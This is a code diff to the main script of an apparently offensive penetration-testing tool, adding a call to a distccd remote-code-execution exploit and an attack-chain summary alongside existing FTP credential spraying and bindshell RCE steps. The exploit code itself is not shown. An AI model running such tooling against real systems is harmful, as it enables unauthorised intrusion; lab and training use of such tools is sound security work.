@@ -3,10 +3,12 @@ from colorama import Fore, Style
 
 from core.recon import run_nmap_scan, detect_http_services
 from core.config import validate_target
+from core.chain_builder import build_attack_chain
 
 from exploits.weak_creds import spray_ftp
 from exploits.ftp_access import validate_ftp_access
 from exploits.bindshell_rce import exploit_bindshell
+from exploits.distccd_rce import exploit_distccd
 
 def main():
     parser = argparse.ArgumentParser(
@@ -108,6 +110,34 @@ def main():
         print(f"[RCE OUTPUT] {rce_output}")
     else:
         print(Fore.RED + "\n[!] RCE attempt unsuccessful" + Style.RESET_ALL)
+
+    # -----------------------
+    # Alternate RCE Path 
+    # -----------------------
+    distccd_output = exploit_distccd(target)
+
+    if distccd_output:
+        print(
+            Fore.RED +
+            "\n[!!!] ALTERNATE RCE CONFIRMED (DISTCCD)" +
+            Style.RESET_ALL
+        )
+        print(f"[RCE OUTPUT] {distccd_output}")
+    else:
+        print(
+            Fore.YELLOW +
+            "\n[!] distccd RCE assessed — command output not returned by service" +
+            Style.RESET_ALL
+        )
+
+    # -----------------------
+    # Attack Chain Summary
+    # -----------------------
+    chain = build_attack_chain()
+
+    print(Fore.CYAN + "\n[+] ATTACK CHAIN SUMMARY:" + Style.RESET_ALL)
+    for step in chain:
+        print(f" - {step}")
 
 
 if __name__ == "__main__":
